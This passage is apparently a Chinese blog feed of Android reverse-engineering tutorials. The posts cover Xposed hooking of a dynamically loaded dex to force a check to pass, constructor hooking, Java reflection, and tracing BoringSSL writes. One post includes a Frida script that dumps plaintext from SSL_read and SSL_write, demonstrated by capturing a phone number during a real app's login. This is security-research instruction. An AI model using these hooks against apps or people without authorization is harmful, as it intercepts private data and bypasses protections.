<img src="/2023/12/25/Hook%E5%A4%9Adex%E7%9A%84app/image-20231222115435413.png" class="" title="image-20231222115435413">

<center>图2</center>

<ul>
<li>反编译后可以看到代码使用<code>DexClassLoader</code>加载了<strong>1.dex</strong>，然后使用反射的方式找到里面的<code>testcontent</code>方法。然后调用了这个方法，如果返回值结果为false就会打印<strong>Sorry!</strong></li>
<li>对这种插件dex，再用上一章的hook <code>onCreate</code>函数，等其执行完之后去拿到<code>ClassLoader</code>的办法显然就不行了，因为这里的<code>classLoader</code>并不需要修正。</li>
</ul>
<h3 id="处理动态加载的dex中的函数"><a href="#处理动态加载的dex中的函数" class="headerlink" title="处理动态加载的dex中的函数"></a>处理动态加载的dex中的函数</h3><h6 id="那么接下来的目标就是hook图2中的1-dex-gt-com-kanxue-test02-TestClass-gt-testcontent"><a href="#那么接下来的目标就是hook图2中的1-dex-gt-com-kanxue-test02-TestClass-gt-testcontent" class="headerlink" title="那么接下来的目标就是hook图2中的1.dex->com.kanxue.test02.TestClass->testcontent"></a>那么接下来的目标就是hook图2中的<code>1.dex-&gt;com.kanxue.test02.TestClass-&gt;testcontent</code></h6><p>首先还是要拿到<strong>1.dex</strong>的ClassLoader，这里用到的是<code>DexClassLoader</code>那我们就可以通过hook <code>DexClassLoader</code>的构造函数来获取我们想拿到的dex的实例，<a href="https://xiaoeeyu.github.io/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/">构造函数的hook方法</a>在之前的章节中讲过</p>
<img src="/2023/12/25/Hook%E5%A4%9Adex%E7%9A%84app/image-20231222171628850.png" class="" title="image-20231222171628850">

<center>图3</center>

<ul>
<li><p>这里拿到了要加载的dex的路径，把dex文件拿出来看一下</p>
</li>
<li><p>这里同样也可以用上一章文末讲的方法把dex中的类列表打印出来</p>
<blockquote>
<img src="/2023/12/25/Hook%E5%A4%9Adex%E7%9A%84app/image-20231222175252508.png" class="" title="image-20231222175252508">

<center>图4</center>

<ul>
<li>不过这个测试的时候不稳定，有时候能打印出来，有时候打印的残缺不全或者打印不出来可以多试几次</li>
</ul>
</blockquote>
</li>
</ul>
<h6 id="将dex文件从设备中pull出来分析一下testcontent"><a href="#将dex文件从设备中pull出来分析一下testcontent" class="headerlink" title="将dex文件从设备中pull出来分析一下testcontent"></a>将dex文件从设备中pull出来分析一下<code>testcontent</code></h6><img src="/2023/12/25/Hook%E5%A4%9Adex%E7%9A%84app/image-20231222172515619.png" class="" title="image-20231222172515619">

<center>图5</center>

<ul>
<li>这里可以看到这个函数非常简单，只是对传进来的参数进行MD5和补全后进行对比如果不同就返回false</li>
</ul>
<h6 id="通过图4可以发现成功的找到了目标类，这时候就可以通过这个ClassLoader来hook目标函数"><a href="#通过图4可以发现成功的找到了目标类，这时候就可以通过这个ClassLoader来hook目标函数" class="headerlink" title="通过图4可以发现成功的找到了目标类，这时候就可以通过这个ClassLoader来hook目标函数"></a>通过图4可以发现成功的找到了目标类，这时候就可以通过这个ClassLoader来hook目标函数</h6><p>hook这个函数之后，就可以通过修改参数让其符合校验或者直接修改返回值为true都是可以达到目的的</p>
<img src="/2023/12/25/Hook%E5%A4%9Adex%E7%9A%84app/image-20231222181422437.png" class="" title="image-20231222181422437">

<center>图6</center>

<ul>
<li>这里我们就是通过直接修改返回值为true，让其打印结果变为<strong>Congratulations!</strong></li>
</ul>
<p>总结：这里我们成功的对插件dex中的函数进行hook，这里跟hook加壳app的区别主要在于获取ClassLoader的方式不同，hook加壳app需要在<code>onCreate</code>执行完毕修复ClassLoader的时候获取即可，而对这种插件dex进行hook需要先hook<code>DexClassLoader</code>方法，然后再根据返回值获取正确的ClassLoader</p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida Hook</tag>
        <tag>Xposed插件开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Hook构造函数</title>
    <url>/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<p>本章主要是配置一下Xposed开发环境，以及对构造函数进行一个简单的hook。梳理一下Xposed插件开发流程</p>
<span id="more"></span>

<h2 id="Xposed开发环境配置"><a href="#Xposed开发环境配置" class="headerlink" title="Xposed开发环境配置"></a>Xposed开发环境配置</h2><h6 id="本次开发环境"><a href="#本次开发环境" class="headerlink" title="本次开发环境"></a>本次开发环境</h6><blockquote>
<p>设备：pixel XL</p>
<p>系统：Android 10</p>
<p>开发平台：Ubuntu 22.04</p>
<p>IDE：Android Studio 2022.3</p>
<p>开发语言：Java</p>
</blockquote>
<p>手机环境配置：Magisk（26）和LSPosed（1.9.2）使用的最新版，<a href="https://xiaoeeyu.github.io/2023/10/04/Android%E5%88%B7%E6%9C%BA-%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">安装教程</a>在之前的章节里面写过了不再赘述</p>
<h3 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h3><p>手机环境配置好了之后，用Android Studio创建一个新的项目：先配置好Android Studio的代理</p>
<img src="/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/image-20231201230014864.png" class="" title="image-20231201230014864">

<img src="/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/image-20231201230105745.png" class="" title="image-20231201230105745">

<ul>
<li>项目名可以随便起个喜欢的</li>
</ul>
<h3 id="编写xposed插件初始化流程"><a href="#编写xposed插件初始化流程" class="headerlink" title="编写xposed插件初始化流程"></a>编写xposed插件初始化流程</h3><img src="/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/image-20250508163723056.png" class="" title="image-20250508163723056">

<h3 id="拷贝API"><a href="#拷贝API" class="headerlink" title="拷贝API"></a>拷贝API</h3><img src="/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/image-20250508163809677.png" class="" title="image-20250508163809677">

<h3 id="修改配置："><a href="#修改配置：" class="headerlink" title="修改配置："></a>修改配置：</h3><p>首先我们引入Xposed的库，这里我们需要在<code>settings.gradle</code>里修改一下</p>
<p><code>maven { url 'https://api.xposed.info/' }</code></p>
<img src="/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/image-20231201230444922.png" class="" title="image-20231201230444922">

<p>之后，进入app目录下面的<code>build.gradle</code>引入xposed的依赖</p>
<p><code>compileOnly 'de.robv.android.xposed:api:82'</code></p>
<img src="/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/image-20231201230656210.png" class="" title="image-20231201230656210">

<h3 id="声明模块"><a href="#声明模块" class="headerlink" title="声明模块"></a>声明模块</h3><pre><code class="xml">        &lt;!-- 是否为Xposed模块 --&gt;
        &lt;meta-data
            android:name="xposedmodule"
            android:value="true"/&gt;
        &lt;!-- 模块的简介（在框架中显示） --&gt;
        &lt;meta-data
            android:name="xposeddescription"
            android:value="我是Xposed模块test05" /&gt;
        &lt;!-- 模块最低支持的Api版本 一般填54即可 --&gt;
        &lt;meta-data
            android:name="xposedminversion"
            android:value="54"/&gt;
</code></pre>
<img src="/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/image-20231201230932414.png" class="" title="image-20231201230932414">

<h3 id="模块编写"><a href="#模块编写" class="headerlink" title="模块编写"></a>模块编写</h3><p>创建一个入口类</p>
<pre><code class="java">public class MainHook implements IXposedHookLoadPackage {
    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable {
        Log.i("MainHook", lpparam.packageName);
        XposedBridge.log("MainHook-&gt;app packagename" + lpparam.packageName);

    }
}
</code></pre>
<img src="/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/image-20231201231154212.png" class="" title="image-20231201231154212">



<p>然后我们还需要定义一下入口类：</p>
<p>创建一个<code>assets</code>文件夹，并创建一个文件名叫<code>xposed_init</code></p>
<img src="/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/image-20231201231458997.png" class="" title="image-20231201231458997">

<ul>
<li>可以定义多个入口</li>
</ul>
<h3 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下"></a>测试一下</h3><p>可以输入命令重启一下手机</p>
<p><code>adb reboot</code></p>
<img src="/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/image-20231201231804562.png" class="" title="image-20231201231804562">

<p>在Android Studio的<code>Logcat</code>中可以查看到调用结果</p>
<img src="/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/image-20231202134042460.png" class="" title="image-20231202134042460">

<h2 id="Hook构造函数"><a href="#Hook构造函数" class="headerlink" title="Hook构造函数"></a>Hook构造函数</h2><h4 id="我们先写一个简单的app"><a href="#我们先写一个简单的app" class="headerlink" title="我们先写一个简单的app"></a>我们先写一个简单的app</h4><p><a href="https://github.com/xiaoeeyu/XposedHook01">测试用例</a></p>
<p>主要内容就是几个构造函数：分别为带参数和不带参数的，然后再调用一下</p>
<pre><code class="java">public class Student {
    String name = null;
    String id = null;
    int age = 0;
    public Student(){
        name = "default";
        id = "default";
        age = 10;
    }
    public Student(String name){
        this.name = name;
        id = "default";
    }
    public Student(String name, String id){
        this.name = name;
        this.id = id;
    }
    public Student(String name, String id, int age){
        this.name = name;
        this.id = id;
        this.age = age;
    }
}
</code></pre>
<ul>
<li>将这个测试项目编译完成后先安装在手机上</li>
</ul>
<h4 id="接下来开始我们对构造函数的hook"><a href="#接下来开始我们对构造函数的hook" class="headerlink" title="接下来开始我们对构造函数的hook"></a>接下来开始我们对构造函数的hook</h4><p><a href="https://github.com/xiaoeeyu/Xposed01">Hook源码</a></p>
<p>hook我们需要用到<code>findAndHookConstructor</code>这个方法，看源码它有两种实现方式，一种需要传入class一种直接传入类名字符串 + <code>classLoader</code>，下面试一下这两种方式。</p>
<img src="/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/image-20231203101321906.png" class="" title="image-20231203101321906">

<p><strong>无参构造函数</strong></p>
<pre><code class="java">Class StudentClass = classLoader.loadClass("com.xiaoeryu.xposedhook01.Student");

// 使用XposedHelpers.findAndHookConstructor进行构造函数的hook
// StudentClass 是目标类的 Class 对象

XposedHelpers.findAndHookConstructor(StudentClass, new XC_MethodHook() {
    @Override
    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
        super.beforeHookedMethod(param);
        // 在目标构造函数执行之前的逻辑
        XposedBridge.log("xiaoeryu-&gt;beforeHookedMethod");
    }

    @Override
    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
        super.afterHookedMethod(param);
        // 在目标构造函数执行之后的逻辑
        XposedBridge.log("xiaoeryu-&gt;afterHookedMethod");
    }
});
</code></pre>
<p><strong>有参的构造函数</strong></p>
<pre><code class="java">Class StudentClass = classLoader.loadClass("com.xiaoeryu.xposedhook01.Student");

// 参数写为 参数类型.class
XposedHelpers.findAndHookConstructor(StudentClass, String.class, new XC_MethodHook() {
    @Override
    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
        super.beforeHookedMethod(param);
        // 获取参数
        Object[] args = param.args;
        String name = (String) args[0];
        XposedBridge.log("com.xiaoeryu.xposedhook01.Student(String)-&gt;beforeHookedMethod: " + name);
    }

    @Override
    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
        super.afterHookedMethod(param);
        XposedBridge.log("com.xiaoeryu.xposedhook01.Student(String)-&gt;afterHookedMethod");
    }
});
</code></pre>
<p>有参构造函数的另一种调用方式：传入完整类名 + <code>classLoader</code></p>
<pre><code class="java">// 也可以直接以字符串形式传入完整类名
XposedHelpers.findAndHookConstructor("com.xiaoeryu.xposedhook01.Student", loadPackageParam.classLoader, String.class, String.class, int.class, new XC_MethodHook() {
    @Override
    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
        super.beforeHookedMethod(param);
        Object[] args = param.args;
        String name = (String) args[0];
        // 改变参数的值
        args[1] = "2050";
        args[2] = 200;
        String id = (String) args[1];
        int age = (int) args[2];
        XposedBridge.log("com.xiaoeryu.xposedhook01.Student(String, String, int)-&gt;beforeHookedMethod: " + name + "--" + id + "--" + age);
    }

    @Override
    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
        super.afterHookedMethod(param);
        // 经过测试构造函数的返回对象是使用thisObject获取，而不是使用getResult()获取，这是因为构造函数都是void类型
        Object thisObj = param.thisObject;
        Object returnObj = param.getResult();
        XposedBridge.log( thisObj + "---" + returnObj);
        XposedBridge.log("com.xiaoeryu.xposedhook01.Student(String, String, int)-&gt;afterHookedMethod");
    }
});
</code></pre>
<h4 id="代码主要就上面这些，然后过一遍它的执行流程"><a href="#代码主要就上面这些，然后过一遍它的执行流程" class="headerlink" title="代码主要就上面这些，然后过一遍它的执行流程"></a>代码主要就上面这些，然后过一遍它的执行流程</h4><ol>
<li><p>将我们要测试的目标app先安装再设备上</p>
</li>
<li><p>然后将我们的xposed插件安装上，并且在LSPosed中勾选我们要hook的目标app</p>
<img src="/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/image-20231202204314414.png" class="" title="image-20231202204314414">
</li>
<li><p>之后我们在勾选系统框架的时候会提示需要重启才能生效，我们点击重启即可或者自己手动重启也一样</p>
</li>
<li><p>然后我们就可以在Android Studio的Logcat界面看到我们插件的执行情况</p>
<img src="/2023/12/02/Hook%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/image-20231202204521111.png" class="" title="image-20231202204521111"></li>
</ol>
<p>本章的XposedHook都比较简单，主要是过一遍Xposed插件的编写流程，后面几章会涉及到如果是加壳的app或者动态下发的dex等等，在这些情况下我们应该怎么去写hook插件</p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Xposed插件开发</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反射</title>
    <url>/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<p>写代码测试了一下JAVA反射</p>
<span id="more"></span>

<h3 id="Java反射的相关类"><a href="#Java反射的相关类" class="headerlink" title="Java反射的相关类"></a>Java反射的相关类</h3><img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231010014651140.png" class="" title="image-20231010014651140">

<p>Class类</p>
<img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231010014725497.png" class="" title="image-20231010014725497">

<p>拿到Class之后可以获取它的属性</p>
<img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231010014739104.png" class="" title="image-20231010014739104">

<img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231010014801504.png" class="" title="image-20231010014801504">

<img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231010014808623.png" class="" title="image-20231010014808623">

<img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231010014815673.png" class="" title="image-20231010014815673">

<img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231010014822784.png" class="" title="image-20231010014822784">

<img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231010014828767.png" class="" title="image-20231010014828767">

<img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231010014833735.png" class="" title="image-20231010014833735">

<p>Java封装</p>
<img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231010014855385.png" class="" title="image-20231010014855385">

<h3 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h3><p>写<a href="https://github.com/xiaoeeyu/ReflectionTest">代码</a>测试一下Java反射中用到的一些api的使用方法</p>
<p><strong>新建一个类来定义一些Field和函数</strong></p>
<img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231010014948175.png" class="" title="image-20231010014948175">

<p>在主函数中去通过反射调用，测试一下（测试变量调用）</p>
<img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231010015018997.png" class="" title="image-20231010015018997">

<ul>
<li>如果是StaticField那么它是属于类的，可以直接通过类调用</li>
<li>如果是PrivateField那么它是属于实例的，需要实例化之后调用</li>
<li>如果是Private还需要修改访问权限<code>setAccessible(true);   // 通过取消权限检查来修改访问限制</code></li>
</ul>
<p>在主函数中去通过反射调用，测试一下（测试函数调用）</p>
<img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231010015038472.png" class="" title="image-20231010015038472">

<ul>
<li>跟变量的调用方式是一样的</li>
</ul>
<p>以及在native中调用的流程也是一样的，只是使用的api不同</p>
<img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231010015049285.png" class="" title="image-20231010015049285">

<ul>
<li><p>对比</p>
<blockquote>
<p>获取类名：<code>Test.class</code>&gt;<code>env-&gt;FindClass</code></p>
<p>获取FieldID：<code>testClazz.getDeclaredField</code>&gt;<code>env-&gt;GetStaticFieldID</code></p>
<p>获取值：<code>publicStaticField_field.get</code>&gt;<code>env-&gt;GetStaticObjectField</code></p>
</blockquote>
</li>
</ul>
<h6 id="native使用C和C-编写会略有不同"><a href="#native使用C和C-编写会略有不同" class="headerlink" title="native使用C和C++编写会略有不同"></a>native使用C和C++编写会略有不同</h6><img src="/2023/10/10/JAVA%E5%8F%8D%E5%B0%84/image-20231012014949471.png" class="" title="image-20231012014949471">

<blockquote>
<p>用C实现的话，函数调用的第一个参数要传入<strong>JNIEnv</strong>*</p>
<ul>
<li>因为在<strong>jni.h</strong>中的声明不同，所以C在使用这些api的时候需要传入env作为第一个参数，还有C里面没有<strong>String</strong>所以字符串要改为<strong>char</strong>*之类的改动</li>
<li>总体来说C要比C++更麻烦一些，不如C++简洁</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>NDK开发</category>
      </categories>
      <tags>
        <tag>JAVA反射</tag>
      </tags>
  </entry>
  <entry>
    <title>JNI层SSL通信抓包与溯源</title>
    <url>/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/</url>
    <content><![CDATA[<p>在一些场景下对App与服务端交互的数据安全程度要求较高，可能会对通信进行加密传输</p>
<ul>
<li>使用<strong>HTTPS/TLS</strong>：使用HTTPS协议，在传输层使用TLS进行加密，确保数据在传输过程中不会被窃取或篡改。</li>
<li><strong>SSL Pinning</strong>：通过SSL Pinning确保客户端只信任特定的服务器证书，防止中间人攻击。</li>
</ul>
<p>在<strong>HTTPS/SSL</strong>通信的过程当中可以使用Java层的API完成与服务器的通信，也有可能在JNI层直接使用<strong>openssl/boringSSL</strong>（在JNI层当中去使用SSL通信与服务器建立一个安全的加密通道来完成数据的发送）。</p>
<p>之前我们分析了在Java层的SSL，现在这篇文章来分析一下JNI层的SSL</p>
<p>要完成对JNI层SSL通信的抓包和溯源，需要对<code>NativeCryptoClass.SSL_read</code>、还有<code>NativeCryptoClass.SSL_write</code>这两个Java层函数继续往下分析进入到<code>libc</code>当中的系统调用（这里以11.0的源码为例）</p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240703142204225.png" class="" title="image-20240703142204225">

<p>继续往下寻找这个JNI函数的实现，他完整的名字就是<code>NativeCrypto_SSL_write</code>、<code>NativeCrypto_SSL_read</code>。</p>
<p>这两个函数所在的文件位置都是一样的，接下来我们以<code>NativeCrypto_SSL_write</code>为例分析</p>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240703142820657.png" class="" title="image-20240703142820657">

<ul>
<li><p>将<code>jbyteArray b</code>转成了<code>jbyte buf[1024]</code>由<code>sslWrite</code>进行循环发送</p>
</li>
<li><p>接下来我们需要搞明白<code>NativeCrypto_SSL_write</code>是如何调用BoringSSL把App的数据进行加密，然后进行发送的</p>
</li>
</ul>
<p>继续分析这个<code>sslWrite</code>函数</p>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240703143516467.png" class="" title="image-20240703143516467">

<ul>
<li>调用了boringSSL库中的<code>SSL_write</code>发送<code>buf</code></li>
</ul>
<p>从<a href="https://github.com/search?q=repo:google/boringssl+SSL_write&amp;type=code">boringssl</a>和<a href="http://aospxref.com/android-11.0.0_r21/xref/external/boringssl/src/ssl/ssl_lib.cc#1093">源码</a>中都可以找到<code>SSL_write</code>，这里注意大小写</p>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240703144125902.png" class="" title="image-20240703144125902">

<ul>
<li>继续往下分析<code>write_app_data</code></li>
</ul>
<blockquote>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240703144303407.png" class="" title="image-20240703144303407">

<ul>
<li>这里不能直接搜索<code>write_app_data</code>，需要在前面加一个前缀<strong>ssl3</strong>，仅限于当前版本，在之后版本的源码中可能会变</li>
</ul>
</blockquote>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240703144927323.png" class="" title="image-20240703144927323">

<ul>
<li>那么继续分析<code>do_ssl3_write</code>，第三个参数是要发送的数据</li>
</ul>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240703150731658.png" class="" title="image-20240703150731658">

<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240703150903934.png" class="" title="image-20240703150903934">

<ul>
<li>到了这里之后，看到了参数中开始有cipher相关的关键字。特别关注一下这个函数，可能再往下就开始对数据进行加密了</li>
<li>继续往下跟踪<code>ssl3_write_pending</code></li>
</ul>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240703152003215.png" class="" title="image-20240703152003215">

<ul>
<li><p><code>in</code> 参数是指向待发送数据的指针，但在 <code>ssl3_write_pending</code> 函数中并没有直接发送 <code>in</code> 指向的数据。实际上，<code>ssl3_write_pending</code> 函数主要用于处理之前挂起的写操作，并检查当前的写操作是否与之前的挂起操作兼容。</p>
<p>数据的实际发送是通过 <code>ssl_write_buffer_flush</code> 函数完成的。<code>ssl_write_buffer_flush</code> 会处理实际的数据发送操作，将挂起的数据通过底层的网络套接字发送出去。</p>
</li>
<li><p>继续往下跟踪<code>ssl_write_buffer_flush</code></p>
</li>
</ul>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240703153446419.png" class="" title="image-20240703153446419">

<ul>
<li>根据ssl版本的不同调用不同的API</li>
<li>这两个API都是调用了<code>BIO_write</code>发送数据</li>
</ul>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240703215503310.png" class="" title="image-20240703215503310">

<ul>
<li><p>继续跟踪<code>bwrite</code></p>
<blockquote>
<p>这里继续往下跟踪较为麻烦一些，先跟过去</p>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240703220155748.png" class="" title="image-20240703220155748">

<ul>
<li><code>BIO_METHOD</code> 结构体定义了很多函数指针来执行各种<code>BIO</code>操作，这里我们只关注<code>bwrite</code></li>
<li>再往上翻翻其它定义，找到了 <code>BIO_s_socket</code> 方法的声明</li>
</ul>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240703220552069.png" class="" title="image-20240703220552069">

<ul>
<li>接下来，跟进去找到 <code>BIO_s_socket</code> 的实现</li>
</ul>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240704115929226.png" class="" title="image-20240704115929226">

<ul>
<li>这里在socket.c文件中，定义了一个具体的 <code>BIO_METHOD</code> 结构体实例 <code>methods_sockp</code>，并将 <code>bwrite</code> 指向<code>BIO_METHOD</code> 结构体的第一个成员 <code>sock_write</code> 函数，<code>sock_read</code>对应的自然是第二个成员<code>bread</code></li>
</ul>
<p>用IDA分析libc.so文件，我们也能找到<code>write</code>的系统调用号</p>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240704210515378.png" class="" title="image-20240704210515378"></blockquote>
</li>
</ul>
<p>这里根据跟踪到的结果我们就可以知道实际的调用流程：</p>
<blockquote>
<p>当调用 <code>BIO_write</code> 时，实际调用的是 <code>bio-&gt;method-&gt;bwrite</code>，即 <code>sock_write</code> 函数</p>
</blockquote>
<p>在 <code>sock_write</code> 函数中不同的平台调用了不同的函数来完成数据发送。WINDOWS平台使用<code>send</code>其它平时使用<code>write</code></p>
<p><strong>总结：所以此时我们可以知道在boringssl中并没有使用libc中的<code>sendto</code>来进行加密数据的发送，而是使用的<code>write</code>。读取使用的是<code>read</code>，同样是在socket.c文件中这里不再展开赘述。所以我们hook libc中的<code>sendto</code>、<code>recvfrom</code>是无法获取到HTTPS/SSL的数据包的</strong></p>
<h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><p>经过我们对源码的分析发现SSL加密的分界线在<code>do_ssl3_write</code>之后</p>
<blockquote>
<p>sslWrite、SSL_write、ssl3_write_app_data、do_ssl3_write</p>
<p>明文密文分水岭</p>
<p>ssl3_write_pending、BIO_write、sock_write、write</p>
</blockquote>
<p>获取明文的数据就需要hook <code>do_ssl3_write</code>之前的函数</p>
<p>这里我们以<code>SSL_write</code>为hook目标编写脚本获取SSL通信的明文数据</p>
<pre><code class="js">function LogPrint(log) {
    var theDate = new Date();
    var time = theDate.toISOString().split('T')[1].replace('Z', '');
    var threadid = Process.getCurrentThreadId();
    console.log(`[${time}] -&gt; threadid:${threadid} -- ${log}`);
}

function printNativeStack(context, name) {
    var array = Thread.backtrace(context, Backtracer.ACCURATE);
    var first = DebugSymbol.fromAddress(array[0]);
    if (first.toString().indexOf('libopenjdk.so!NET_Send') &lt; 0) {
        var trace = array.map(DebugSymbol.fromAddress).join("\n");
        LogPrint(`-----------start:${name}--------------`);
        LogPrint(trace);
        LogPrint(`-----------end:${name}--------------`);
    }
}

function hooklibssl() {
    var libsslmodule = Process.getModuleByName("libssl.so");
    var SSL_read_addr = libsslmodule.getExportByName("SSL_read");
    var SSL_write_addr = libsslmodule.getExportByName("SSL_write");
    console.log(SSL_read_addr + "---" + SSL_write_addr);
    // SSL_write(SSL *ssl, const void *buf, int num)
    Interceptor.attach(SSL_read_addr, {
        onEnter: function (args) {
            this.arg0 = args[0];
            this.arg1 = args[1];
            this.arg2 = args[2];

            LogPrint("go into libssl.so-&gt;SSL_read");

            printNativeStack(this.context, Process.getCurrentThreadId() + "SSL_read");
        },
        onLeave(retval) {
            var size = retval.toInt32();
            if (size &gt; 0) {
                console.log(Process.getCurrentThreadId() + "---libssl.so-&gt;SSL_read:" + hexdump(this.arg1, {
                    length: size
                }));
            }

            LogPrint("leave libc.so-&gt;SSL_read");
        },
    });
    // int SSL_read(SSL *ssl, void *buf, int num)
    Interceptor.attach(SSL_write_addr, {
        onEnter: function (args) {
            this.arg0 = args[0];
            this.arg1 = args[1];
            this.arg2 = args[2];

            LogPrint("go into libssl.so-&gt;SSL_write");
            printNativeStack(this.context, Process.getCurrentThreadId() + "SSL_write");
        },
        onLeave(retval) {
            var size = ptr(this.arg2).toInt32();
            if (size &gt; 0) {
                console.log(Process.getCurrentThreadId() + "---libssl.so-&gt;SSL_write:" + hexdump(this.arg1, {
                    length: size
                }));
            }

            LogPrint("leave libssl.so-&gt;SSL_write");
        },
    });
}

function main() {
    hooklibssl();
}

setImmediate(main);
</code></pre>
<h4 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h4><p>这里我们以腾讯新闻App的登陆功能为例：</p>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240704192649590.png" class="" title="image-20240704192649590">

<p>执行命令：可能抓取到明文的手机号码</p>
<p><code>frida -UF -l HOpenssl.js -o TXHO.log</code></p>
<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240704192225115.png" class="" title="image-20240704192225115">

<p>直接使用抓包工具无法抓到SSL的明文数据</p>
